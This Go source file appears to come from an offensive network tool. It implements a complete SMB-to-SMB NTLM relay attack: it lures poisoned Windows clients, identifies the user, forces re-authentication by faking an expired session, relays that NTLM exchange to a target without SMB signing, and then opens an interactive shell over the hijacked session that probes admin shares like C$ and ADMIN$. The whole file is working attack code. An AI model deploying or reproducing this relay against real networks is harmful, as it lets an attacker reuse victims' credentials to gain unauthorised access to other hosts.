// Package smbrelay implements an SMB->SMB NTLM relay. It runs its
// own SMB2 server (toward the poisoned victim) and SMB2 client (toward the
// target) and is intentionally independent of libs/smb (the capture server used
// by --llmnr/--nbt-ns/--mdns).
//
// It reproduces literal two-phase behaviour:
//
//	Phase 1 (identify): the victim authenticates against US with our own NTLM
//	  challenge. We accept it (STATUS_SUCCESS) only to learn DOMAIN/user — the
//	  response is computed against our challenge and is useless for relay. This
//	  is the "connection will be relayed after re-authentication" stage.
//	Phase 2 (relay): the victim issues a TREE_CONNECT; we pick a target, open a
//	  client to it, and answer the tree connect with STATUS_NETWORK_SESSION_-
//	  EXPIRED. Windows then re-authenticates on the same connection, and THIS
//	  NTLM exchange we forward byte-for-byte to the target. Because the victim's
//	  response is now computed against the target's challenge (and the NTLMv2
//	  MIC covers the three raw messages we never alter), it validates there.
package smbrelay

import (
	"bufio"
	"errors"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

// Colors: [SMB] is yellow; an aborting reason is printed in red; "Exiting..."
// is printed in white.
const (
	clrReset  = "\x1b[0m"
	clrYellow = "\x1b[93m"
	clrRed    = "\x1b[91m"
	clrWhite  = "\x1b[97m"

	relayTag = clrYellow + "[SMB]" + clrReset

	shellBasePort = 11000 // first interactive-shell TCP port; +1 per attack
)

// ErrAttackCancelled is returned by Prepare once the operator-facing reason
// (target down / signing required) has already been printed.
var ErrAttackCancelled = errors.New("smb relay: attack cancelled")

// Relayer scans the relay pair, refuses to run against a signing-required
// target, and serves the relay listener on :445.
type Relayer struct {
	Interface string
	RelayFrom string // victim IP — lured to us by the poisoners
	RelayTo   string // target IP — where captured auth is replayed

	mu         sync.Mutex
	targetDone bool
	attackID   int
}

// Prepare runs the pre-flight scan + signing probe. Returns ErrAttackCancelled
// when the attack must not start (so no poisoning happens).
func (r *Relayer) Prepare() error {
	if net.ParseIP(stripZone(r.RelayTo)) == nil {
		return fmt.Errorf("invalid --relay-to IP: %q", r.RelayTo)
	}
	if r.RelayFrom != "" && net.ParseIP(stripZone(r.RelayFrom)) == nil {
		return fmt.Errorf("invalid --relay-from IP: %q", r.RelayFrom)
	}

	fmt.Printf("%s Scanning for SMB (445/tcp) on relay targets...\n", relayTag)
	if r.RelayFrom != "" {
		fmt.Printf("%s relay-from %-39s : %s\n", relayTag, r.RelayFrom, upDown(scanSMB(r.RelayFrom)))
	} else {
		fmt.Printf("%s relay-from %-39s : %s\n", relayTag, "(any host)", "poisoning all responders")
	}
	toUp := scanSMB(r.RelayTo)
	fmt.Printf("%s relay-to   %-39s : %s\n", relayTag, r.RelayTo, upDown(toUp))

	if !toUp {
		fmt.Printf("%s SMB is not reachable on relay-to %s; nothing to relay against.\n", relayTag, r.RelayTo)
		return ErrAttackCancelled
	}

	cl, err := dialSMB(r.RelayTo)
	if err != nil {
		fmt.Printf("%s Could not open SMB to relay-to %s: %v\n", relayTag, r.RelayTo, err)
		return ErrAttackCancelled
	}
	signingRequired, err := cl.negotiate()
	cl.close()
	if err != nil {
		fmt.Printf("%s SMB negotiate with relay-to %s failed: %v\n", relayTag, r.RelayTo, err)
		return ErrAttackCancelled
	}
	if signingRequired {
		fmt.Printf("%s- SMB Signing is required for %s ; the attack cannot be performed.%s\n", clrRed, r.RelayTo, clrReset)
		return ErrAttackCancelled
	}

	fmt.Printf("%s Target %s is relayable (SMB signing not required). Starting poisoners + relay server.\n", relayTag, r.RelayTo)
	return nil
}

// Run serves the relay listener on :445 and blocks.
func (r *Relayer) Run() error {
	ln, err := net.Listen("tcp", fmt.Sprintf(":%d", smbPort))
	if err != nil {
		return fmt.Errorf("listen tcp :%d: %w", smbPort, err)
	}
	defer ln.Close()
	fmt.Printf("%s Relay server active on 0.0.0.0:%d  (relay-from %s -> relay-to %s)\n",
		relayTag, smbPort, r.RelayFrom, r.RelayTo)

	for {
		conn, err := ln.Accept()
		if err != nil {
			return err
		}
		go r.handleVictim(conn)
	}
}

// ─────────────────────────────────────────────────── victim side ──────────

// victimConn holds the per-connection state of one poisoned client as it moves
// through phase 1 (local auth) and phase 2 (relayed re-auth).
type victimConn struct {
	r    *Relayer
	conn net.Conn
	ip   string

	vSess      []byte // victim-facing SessionId, assigned on the first SESSION_SETUP
	identified bool   // phase 1 complete: we know domain/user
	relaying   bool   // phase 2 armed: a target is reserved and connected

	domain, user, workstation string
	client                    *smbClient // live target session during/after phase 2
}

// handleVictim is the SMB2 command loop for one TCP connection. A single victim
// connection carries both phases: NEGOTIATE, the phase-1 SESSION_SETUP pair, a
// TREE_CONNECT (which we expire), then the phase-2 SESSION_SETUP pair.
func (r *Relayer) handleVictim(conn net.Conn) {
	vs := &victimConn{r: r, conn: conn, ip: remoteIP(conn)}
	defer vs.cleanup()
	defer conn.Close()

	if r.RelayFrom != "" && stripZone(vs.ip) != stripZone(r.RelayFrom) {
		return
	}

	fmt.Printf("%s Incoming SMB connection from %s\n", relayTag, vs.ip)

	for {
		pkt, err := nbRead(conn)
		if err != nil {
			return
		}

		// NetBIOS session request.
		if len(pkt) > 0 && pkt[0] == 0x81 {
			conn.Write([]byte{0x82, 0x00, 0x00, 0x00})
			continue
		}

		// SMBv1 NEGOTIATE → bump to the SMB2 wildcard dialect so Windows re-negotiates with SMB2.
		if isSMB1Nego(pkt) {
			if nbWrite(conn, append(respHdr(cmdNegotiate, stSuccess, make([]byte, 8), make([]byte, 8), 1), negoRespBody(dialectWildcard)...)) != nil {
				return
			}
			continue
		}

		if !isSMB2(pkt) {
			return
		}

		switch smb2Cmd(pkt) {
		case cmdNegotiate:
			// Downgrade the victim to SMB 2.0.2 and advertise NTLM.
			if nbWrite(conn, append(respHdr(cmdNegotiate, stSuccess, smb2MsgID(pkt), make([]byte, 8), smb2Credits(pkt)), negoRespBody(dialect202)...)) != nil {
				return
			}
		case cmdSessionSetup:
			if !vs.sessionSetup(pkt) {
				return
			}
		case cmdTreeConnect:
			if !vs.treeConnect(pkt) {
				return
			}
		default:
			// We only drive the flow up to TREE_CONNECT; deny anything else.
			nbWrite(conn, append(respHdr(smb2Cmd(pkt), stAccessDenied, smb2MsgID(pkt), smb2SessID(pkt), smb2Credits(pkt)), errorBody()...))
		}
	}
}

// sessionSetup handles one SESSION_SETUP request. In phase 1 it answers with our
// own challenge / accepts the auth locally; in phase 2 it relays the exchange
// to the target. Returns false to close the connection.
func (vs *victimConn) sessionSetup(pkt []byte) bool {
	conn := vs.conn
	msgID := smb2MsgID(pkt)
	credits := smb2Credits(pkt)
	blob := reqSecBlob(pkt)

	if !vs.relaying {
		// A victim that mandates SMB signing cannot be relayed: its session
		// would require signed responses we can't produce. The SESSION_SETUP
		// request's SecurityMode byte (body offset 3) carries 0x02 when signing
		// is required.
		if reqSigningRequired(pkt) {
			fmt.Printf("%s- SMB Signing is required for %s ; the attack cannot be performed.%s\n", clrRed, vs.ip, clrReset)
			if vs.r.RelayFrom != "" {
				// A specific victim was targeted and it's unrelayable — stop.
				fmt.Printf("%s- Exiting...%s\n", clrWhite, clrReset)
				os.Exit(0)
			}
			return false // opportunistic mode: skip this host, keep poisoning
		}

		// ── Phase 1: local auth, just to identify the victim ──────────────
		switch ntlmType(blob) {
		case 1:
			if vs.vSess == nil {
				vs.vSess = randBytes(8)
			}
			var ch [8]byte
			copy(ch[:], randBytes(8))
			challenge := wrapNegTokenResp(buildChallenge(ch))
			return nbWrite(conn, append(respHdr(cmdSessionSetup, stMoreProcessing, msgID, vs.vSess, credits), sessRespBody(challenge)...)) == nil
		case 3:
			vs.domain, vs.user, vs.workstation = parseType3Identity(blob)
			vs.identified = true
			if nbWrite(conn, append(respHdr(cmdSessionSetup, stSuccess, msgID, vs.vSess, credits), sessRespBody(spnegoAcceptCompleted())...)) != nil {
				return false
			}
			fmt.Printf("%s Received connection from %s/%s at %s, connection will be relayed after re-authentication\n",
				relayTag, vs.domain, vs.user, vs.workstation)
			return true
		default:
			return false
		}
	}

	// ── Phase 2: relay the re-authentication to the target ────────────────
	switch ntlmType(blob) {
	case 1:
		challenge, status, err := vs.client.sessionSetup(blob)
		if err != nil || status != stMoreProcessing {
			fmt.Printf("%s Target smb://%s did not return a challenge (status=0x%08x): %v\n", relayTag, vs.r.RelayTo, status, err)
			return false
		}
		return nbWrite(conn, append(respHdr(cmdSessionSetup, stMoreProcessing, msgID, vs.vSess, credits), sessRespBody(challenge)...)) == nil
	case 3:
		_, status, err := vs.client.sessionSetup(blob)
		if err != nil || status != stSuccess {
			fmt.Printf("%s Authenticating against smb://%s as %s FAILED\n", relayTag, vs.r.RelayTo, upperUser(vs.domain, vs.user))
			nbWrite(conn, append(respHdr(cmdSessionSetup, stLogonFailure, msgID, vs.vSess, credits), sessRespEmpty()...))
			vs.client.close()
			vs.client = nil
			vs.r.releaseTarget(false)
			return false
		}
		nbWrite(conn, append(respHdr(cmdSessionSetup, stSuccess, msgID, vs.vSess, credits), sessRespBody(spnegoAcceptCompleted())...))
		vs.r.reportSuccess(vs.client, vs.domain, vs.user, vs.ip)
		vs.client = nil // ownership handed to the shell
		return false
	default:
		return false
	}
}

// treeConnect handles a TREE_CONNECT. The first one after phase 1 is the relay
// trigger: pick a target, connect to it, and answer with SESSION_EXPIRED to make
// the victim re-authenticate (which phase 2 then relays). Returns false to close.
func (vs *victimConn) treeConnect(pkt []byte) bool {
	conn := vs.conn
	msgID := smb2MsgID(pkt)
	credits := smb2Credits(pkt)
	sendErr := func(status uint32) bool {
		return nbWrite(conn, append(respHdr(cmdTreeConnect, status, msgID, vs.vSess, credits), errorBody()...)) == nil
	}

	// Stray tree connect before auth, or a retry once relaying is underway.
	if vs.relaying || !vs.identified {
		return sendErr(stBadNetworkName)
	}

	if !vs.r.acquireTarget() {
		fmt.Println("- All targets processed!")
		fmt.Printf("%s Connection from %s@%s controlled, but there are no more targets left!\n",
			relayTag, upperUser(vs.domain, vs.user), vs.ip)
		sendErr(stBadNetworkName)
		return false
	}

	fmt.Printf("%s Connection from %s@%s controlled, attacking target smb://%s\n",
		relayTag, upperUser(vs.domain, vs.user), vs.ip, vs.r.RelayTo)

	cl, err := dialSMB(vs.r.RelayTo)
	if err != nil {
		fmt.Printf("%s Connection against target smb://%s FAILED: %v\n", relayTag, vs.r.RelayTo, err)
		vs.r.releaseTarget(false)
		sendErr(stBadNetworkName)
		return false
	}
	signingRequired, err := cl.negotiate()
	if err != nil {
		fmt.Printf("%s NTLM negotiate against smb://%s FAILED: %v\n", relayTag, vs.r.RelayTo, err)
		cl.close()
		vs.r.releaseTarget(false)
		sendErr(stBadNetworkName)
		return false
	}
	if signingRequired { // pre-flight should already have caught this.
		fmt.Printf("%s- SMB Signing is required for %s ; the attack cannot be performed.%s\n", clrRed, vs.r.RelayTo, clrReset)
		cl.close()
		vs.r.releaseTarget(false)
		sendErr(stBadNetworkName)
		return false
	}

	vs.client = cl
	vs.relaying = true
	// The reconnect trigger: Windows re-authenticates the session, and that
	// round is what we relay in phase 2.
	return sendErr(stSessionExpired)
}

// cleanup frees a reserved-but-incomplete relay if the victim disconnects mid
// flow. After a successful relay vs.client is nil (the shell owns it), so this
// does nothing and the target stays marked processed.
func (vs *victimConn) cleanup() {
	if vs.client != nil {
		vs.client.close()
		vs.r.releaseTarget(false)
		vs.client = nil
	}
}

// reportSuccess prints the SUCCEED block and launches the interactive shell
// against the authenticated target session.
func (r *Relayer) reportSuccess(cl *smbClient, domain, user, victimIP string) {
	r.mu.Lock()
	r.attackID++
	id := r.attackID
	r.mu.Unlock()

	who := upperUser(domain, user)
	port := shellBasePort + (id - 1)

	fmt.Printf("%s Authenticating connection from %s@%s against smb://%s SUCCEED [%d]\n",
		relayTag, who, victimIP, r.RelayTo, id)
	fmt.Println()
	startInteractiveShell(cl, fmt.Sprintf("smb://%s@%s", who, r.RelayTo), id, port)
	fmt.Printf("- smb://%s@%s [%d] -> Started interactive SMB client shell via TCP on 127.0.0.1:%d\n",
		who, r.RelayTo, id, port)
	fmt.Println()
	fmt.Println("- All targets processed!")
	fmt.Println()
}

func (r *Relayer) acquireTarget() bool {
	r.mu.Lock()
	defer r.mu.Unlock()
	if r.targetDone {
		return false
	}
	r.targetDone = true
	return true
}

func (r *Relayer) releaseTarget(success bool) {
	r.mu.Lock()
	defer r.mu.Unlock()
	if !success {
		r.targetDone = false
	}
}

// ─────────────────────────────────────────────────── SMB2 client ──────────

type smbClient struct {
	conn      net.Conn
	host      string // target IP, for logging the downgrade attempt
	nextMsgID uint64
	sessionID []byte
}

func dialSMB(host string) (*smbClient, error) {
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, fmt.Sprintf("%d", smbPort)), 4*time.Second)
	if err != nil {
		return nil, err
	}
	return &smbClient{conn: conn, host: host, sessionID: make([]byte, 8)}, nil
}

func (c *smbClient) close() {
	if c.conn != nil {
		c.conn.Close()
		c.conn = nil
	}
}

func (c *smbClient) takeMsgID() uint64 {
	id := c.nextMsgID
	c.nextMsgID++
	return id
}

// negotiate offers SMB 2.0.2 and reports whether the target requires signing.
func (c *smbClient) negotiate() (signingRequired bool, err error) {
	fmt.Printf("- Attempting to downgrade an SMB connection to SMB 2.0.2 to %s\n", c.host)

	c.conn.SetDeadline(time.Now().Add(6 * time.Second))
	defer c.conn.SetDeadline(time.Time{})

	if err = nbWrite(c.conn, append(reqHdr(cmdNegotiate, c.takeMsgID(), nil, 1), negoReqBody()...)); err != nil {
		return false, err
	}
	resp, err := nbRead(c.conn)
	if err != nil {
		return false, err
	}
	if !isSMB2(resp) {
		return false, fmt.Errorf("target did not answer SMB2")
	}
	return negoRespSigningRequired(resp), nil
}

// sessionSetup sends one SESSION_SETUP with secBlob and returns the response
// security blob plus the NT status. The SessionId from the first response is
// captured and reused.
func (c *smbClient) sessionSetup(secBlob []byte) (respBlob []byte, status uint32, err error) {
	c.conn.SetDeadline(time.Now().Add(6 * time.Second))
	defer c.conn.SetDeadline(time.Time{})

	if err = nbWrite(c.conn, append(reqHdr(cmdSessionSetup, c.takeMsgID(), c.sessionID, 1), sessReqBody(secBlob)...)); err != nil {
		return nil, 0, err
	}
	resp, err := nbRead(c.conn)
	if err != nil {
		return nil, 0, err
	}
	if !isSMB2(resp) {
		return nil, 0, fmt.Errorf("non-SMB2 session setup response")
	}
	if allZero(c.sessionID) {
		copy(c.sessionID, smb2SessID(resp))
	}
	return respSecBlob(resp), smb2Status(resp), nil
}

// treeConnect attempts \\target\share over the authenticated session.
func (c *smbClient) treeConnect(target, share string) (uint32, error) {
	c.conn.SetDeadline(time.Now().Add(6 * time.Second))
	defer c.conn.SetDeadline(time.Time{})

	path := utf16LE(fmt.Sprintf(`\\%s\%s`, target, share))
	if err := nbWrite(c.conn, append(reqHdr(cmdTreeConnect, c.takeMsgID(), c.sessionID, 1), treeReqBody(path)...)); err != nil {
		return 0, err
	}
	resp, err := nbRead(c.conn)
	if err != nil {
		return 0, err
	}
	if !isSMB2(resp) {
		return 0, fmt.Errorf("non-SMB2 tree connect response")
	}
	return smb2Status(resp), nil
}

// ─────────────────────────────── local NTLM challenge (phase 1) ───────────

// buildChallenge constructs a minimal NTLMSSP_CHALLENGE (type 2). It only needs
// to be coherent enough that Windows answers with a type-3 we can read the
// username out of — it is never validated.
func buildChallenge(challenge [8]byte) []byte {
	domain := utf16LE("WORKGROUP")

	av := avPair(0x0002, utf16LE("WORKGROUP"))         // NbDomainName
	av = append(av, avPair(0x0001, utf16LE("SMB"))...) // NbComputerName
	av = append(av, 0x00, 0x00, 0x00, 0x00)            // EOL

	const hdr = 56
	domOff := uint32(hdr)
	avOff := domOff + uint32(len(domain))

	m := []byte("NTLMSSP\x00")
	m = append(m, u32(2)...)                                      // MessageType
	m = append(m, u16(uint16(len(domain)))...)                    // TargetName.Len
	m = append(m, u16(uint16(len(domain)))...)                    // TargetName.MaxLen
	m = append(m, u32(domOff)...)                                 // TargetName.Offset
	m = append(m, 0x15, 0x82, 0x89, 0xe2)                         // NegotiateFlags (unicode|ntlm|target-info)
	m = append(m, challenge[:]...)                                // ServerChallenge
	m = append(m, make([]byte, 8)...)                             // Reserved
	m = append(m, u16(uint16(len(av)))...)                        // TargetInfo.Len
	m = append(m, u16(uint16(len(av)))...)                        // TargetInfo.MaxLen
	m = append(m, u32(avOff)...)                                  // TargetInfo.Offset
	m = append(m, 0x06, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f) // Version
	m = append(m, domain...)
	m = append(m, av...)
	return m
}

// wrapNegTokenResp wraps an NTLM message in a SPNEGO NegTokenResp
// (accept-incomplete, supportedMech = NTLM).
func wrapNegTokenResp(ntlm []byte) []byte {
	ntlmOID := []byte{0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a}
	state := asn1(0xa0, asn1(0x0a, []byte{0x01}))
	mech := asn1(0xa1, asn1(0x06, ntlmOID))
	token := asn1(0xa2, asn1(0x04, ntlm))
	inner := append(state, mech...)
	inner = append(inner, token...)
	return asn1(0xa1, asn1(0x30, inner))
}

// spnegoAcceptCompleted is a SPNEGO NegTokenResp carrying only
// negState = accept-completed (0x00), returned on a successful SESSION_SETUP.
func spnegoAcceptCompleted() []byte {
	return asn1(0xa1, asn1(0x30, asn1(0xa0, asn1(0x0a, []byte{0x00}))))
}

func avPair(id uint16, value []byte) []byte {
	b := u16(id)
	b = append(b, u16(uint16(len(value)))...)
	return append(b, value...)
}

func u32(v uint32) []byte {
	b := make([]byte, 4)
	b[0], b[1], b[2], b[3] = byte(v), byte(v>>8), byte(v>>16), byte(v>>24)
	return b
}

// ─────────────────────────────────────────── interactive SMB shell ────────

// startInteractiveShell binds 127.0.0.1:port and, on the first connection,
// drives a tiny command loop over the authenticated target session.
func startInteractiveShell(cl *smbClient, label string, id, port int) {
	ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", port))
	if err != nil {
		fmt.Printf("%s could not bind shell port %d: %v\n", relayTag, port, err)
		cl.close()
		return
	}
	go func() {
		defer ln.Close()
		defer cl.close()
		conn, err := ln.Accept()
		if err != nil {
			return
		}
		defer conn.Close()
		serveShell(conn, cl, label, id)
	}()
}

func serveShell(conn net.Conn, cl *smbClient, label string, id int) {
	w := bufio.NewWriter(conn)
	rd := bufio.NewReader(conn)
	writeln := func(s string) { w.WriteString(s + "\r\n"); w.Flush() }

	writeln(fmt.Sprintf("Interactive SMB client shell [%d] - %s", id, label))
	writeln("Type 'help' for commands.")
	for {
		w.WriteString("# ")
		w.Flush()
		line, err := rd.ReadString('\n')
		if err != nil {
			return
		}
		fields := strings.Fields(line)
		if len(fields) == 0 {
			continue
		}
		switch strings.ToLower(fields[0]) {
		case "help", "?":
			writeln("commands: help | id | shares | use <share> | tree <share> | exit")
		case "id", "whoami":
			writeln(label)
		case "shares":
			writeln("try: use C$   |   use ADMIN$   |   use IPC$   (TREE_CONNECT probes access)")
		case "use", "tree":
			if len(fields) < 2 {
				writeln("usage: use <share>")
				continue
			}
			status, err := cl.treeConnect(targetHostOf(label), fields[1])
			switch {
			case err != nil:
				writeln(fmt.Sprintf("tree connect error: %v", err))
				return
			case status == stSuccess:
				writeln(fmt.Sprintf("OK - connected to %s (access granted)", fields[1]))
			default:
				writeln(fmt.Sprintf("denied - %s (status 0x%08x)", fields[1], status))
			}
		case "exit", "quit":
			writeln("bye")
			return
		default:
			writeln("unknown command; try 'help'")
		}
	}
}

// ─────────────────────────────────────────────────── small helpers ────────

func scanSMB(host string) bool {
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, fmt.Sprintf("%d", smbPort)), 2*time.Second)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func upDown(up bool) string {
	if up {
		return "SMB open"
	}
	return "no SMB / filtered"
}

func upperUser(domain, user string) string { return strings.ToUpper(domain + "/" + user) }

func targetHostOf(label string) string {
	if i := strings.LastIndex(label, "@"); i >= 0 {
		return label[i+1:]
	}
	return label
}

// stripZone removes an IPv6 zone suffix (e.g. fe80::1%eth0) for ParseIP checks.
func stripZone(s string) string {
	if i := strings.Index(s, "%"); i >= 0 {
		return s[:i]
	}
	return s
}
